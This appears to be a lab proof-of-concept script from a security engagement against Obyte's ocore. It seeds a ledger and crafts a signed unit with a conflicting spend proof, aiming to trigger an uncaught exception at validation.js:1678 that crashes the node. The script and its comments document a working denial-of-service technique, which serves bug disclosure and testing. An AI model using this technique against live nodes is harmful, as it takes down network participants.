// exp-b — 1678 CRASH: conflicting spend-proof record is temp-bad + on MC + included in B's parents.
//
// Expectation (from source trace): B's message-level validateSpendProofs -> checkForDoublespends
// -> rows=[U1's (P, owner) record, sequence='temp-bad'] -> owner in B's authors -> graph says U1
// included (B parents = [U1]) -> not too young (U1.mci <= B.last_ball_mci) -> not 'good' -> not
// 'final-bad' -> `throw Error("unreachable code, conflicting spend proof in unit ...")`
// (validation.js:1678). The throw is inside the graph CALLBACK (outside async's iterator try/catch)
// -> uncaughtException -> process crash (the node's handler at network.js:4367 re-throws -> death).
//
// RUN: LAB_NO_NETWORK=1 node lab-obyte.js <abs path>/exp-b-1678-crash.js
// No uncaughtException handler is installed: a crash is the EXPECTED outcome (exit != 0 + stack).
module.exports = async function (db, storage, network, validation, objectHash, signature, composer, mutex, constants) {
  const seed = require("/Users/matheusvsky/Documents/trab/llm-redteam-harness/engagements/obyte-ocore-2026-08/evidence/lab/p2/seed.js");
  const secp256k1 = require("/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore/node_modules/secp256k1");
  seed.zeroEraConstants(constants);

  const owner = seed.genKeyPair(objectHash, signature, secp256k1);
  const S = await seed.seedLedger(db, storage, objectHash, owner, { u1Sequence: "temp-bad", u1Stable: 0 });
  await storage.initCaches();
  console.log("INIT-CACHES-OK temp-bad state seeded; U1=" + S.U1hash);

  const privatePayloadHash = objectHash.getBase64Hash({ asset: S.asset, inputs: [{ unit: S.X.unit, message_index: 0, output_index: 0 }], outputs: [{ address: owner.address, amount: 300, blinding: S.X.blinding }] }, true);
  const objB = seed.buildUnit({ objectHash, objectLength: S.objectLength, owner, timestamp: Math.round(Date.now() / 1000),
    parentUnits: [S.U1hash], lastBall: S.genesis_ball, lastBallUnit: S.GENESIS,
    baseInput: { unit: S.U0baseHash, message_index: 0, output_index: 0 }, baseInputAmount: 100000000, tpsFee: 100000,
    privatePayloadHash, spendProofs: [{ spend_proof: S.P }] });
  seed.signUnit(objectHash, S.ecdsaSig, objB, owner.priv);
  console.log("B=" + objB.unit + " validated with spend_proof=" + S.P);

  const callbacks = {
    ifOk: (state) => console.log("UNEXPECTED ifOk", JSON.stringify(state)),
    ifOkUnsigned: () => console.log("UNEXPECTED ifOkUnsigned"),
    ifUnitError: (err) => console.log("UNEXPECTED clean ifUnitError:", err),
    ifJointError: (err) => console.log("UNEXPECTED clean ifJointError:", err),
    ifTransientError: (err) => console.log("UNEXPECTED clean ifTransientError:", err),
    ifNeedParentUnits: () => console.log("UNEXPECTED ifNeedParentUnits"),
    ifNeedHashTree: () => console.log("UNEXPECTED ifNeedHashTree"),
  };
  validation.validate({ unit: objB }, callbacks);
  // keep the event loop alive long enough for the async graph callback to fire (the throw should crash us)
  await new Promise((r) => setTimeout(r, 15000));
  console.log("NO-CRASH: the process survived validation (unexpected)");
};
